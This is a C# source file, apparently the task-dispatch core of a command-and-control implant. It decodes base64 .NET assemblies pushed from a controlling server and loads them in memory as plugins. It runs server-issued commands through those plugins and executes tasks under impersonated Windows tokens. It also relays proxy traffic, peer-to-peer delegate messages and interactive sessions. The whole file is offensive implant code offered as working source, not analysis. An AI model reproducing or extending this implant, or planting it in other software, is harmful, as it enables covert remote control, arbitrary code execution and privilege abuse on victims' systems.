﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Security.Principal;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Agent.Managers
{
    public class TaskManager : ITaskManager
    {
        private ILogger logger { get; set; }
        public IAssemblyManager assemblyManager { get; set; }
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public TaskManager(ILogger logger, IAssemblyManager assemblyManager, IMessageManager messageManager, ITokenManager tokenManager)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            this.messageManager.AddJob(job);
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };
            switch (job.task.command)
            {
                case "load":
                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (loadCommand is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
                        if (buf.Length > 0)
                        {
                            if(this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf))
                            {
                                LoadTaskResponse cr = new LoadTaskResponse()
                                {
                                    completed = true,
                                    user_output = $"Loaded plugin {loadCommand.command}",
                                    task_id = job.task.id,
                                    commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = loadCommand.command,
                                    }
                                }
                                };
                                this.messageManager.AddTaskResponse(cr.ToJson());
                            }
                            else
                            {
                                LoadTaskResponse cr = new LoadTaskResponse()
                                {
                                    completed = true,
                                    user_output = $"Failed to load plugin {loadCommand.command}",
                                    task_id = job.task.id,
                                    commands = new List<CommandsResponse>()
                                };
                                this.messageManager.AddTaskResponse(cr.ToJson());
                            }
                        }
                    }
                    break;
                case "load-assembly":
                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (command is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(command.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                        }
                    }
                    break;
                default:
                    _ = Task.Run(async () =>
                    {
                        if (!this.assemblyManager.TryGetPlugin(job.task.command, out IPlugin plug))
                        {
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = "Plugin not found. Please load it.",
                                status = "error",
                                completed = true,
                            });
                            return;
                        }

                        if(job.task.token == 0)
                        {
                            try
                            {
                                await plug.Execute(job);
                            }
                            catch (Exception e)
                            {
                                this.messageManager.AddTaskResponse(new TaskResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = e.ToString(),
                                    status = "error",
                                    completed = true,
                                });
                            }
                            return;
                        }

                        try
                        {
                            tokenManager.RunTaskImpersonated(plug, job);
                        }
                        catch (Exception e)
                        {
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = e.ToString(),
                                status = "error",
                                completed = true,
                            });
                        }
                        return;
                    });
                            
                    break;
            }
        }
        public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IFilePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if(plugin is null)
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleFilePluginImpersonated(plugin, job, response)));
                    continue;
                }

                tasks.Add(Task.Run(() =>
                {
                    try
                    {
                        plugin.HandleNextMessage(response);
                    }
                    catch (Exception e)
                    {
                        messageManager.WriteLine(e.ToString(), response.task_id, true, "error");
                    }
                }));
            }

            await Task.WhenAll(tasks);
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            List<Task> tasks = new List<Task>();
            if (!this.assemblyManager.TryGetPlugin<IProxyPlugin>(type, out var plugin))
            {
                return;
            }

            if (plugin is null)
            {
                return;
            }

            if(responses is null)
            {
                return;
            }

            foreach (var response in responses)
            {
                tasks.Add(plugin.HandleDatagram(response));
                //Task.Run(() => plugin.HandleDatagram(response));
            }
            await Task.WhenAll(tasks);

        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                if (!this.assemblyManager.TryGetPlugin<IForwarderPlugin>(response.c2_profile, out var plugin))
                {
                    continue;
                }

                if (plugin is null)
                {
                    continue;
                }

                try
                {
                    tasks.Add(plugin.ForwardDelegate(response));
                }
                catch { }
            }
            await Task.WhenAll(tasks);
        }
        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetPlugin<IInteractivePlugin>(job.task.command, out var plugin))
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response)));
                    continue;
                }

                try
                {
                    tasks.Add(Task.Run(() => plugin.Interact(response)));
                }
                catch { }
            }

            //I might not need this
            await Task.WhenAll(tasks);
        }
    }
}
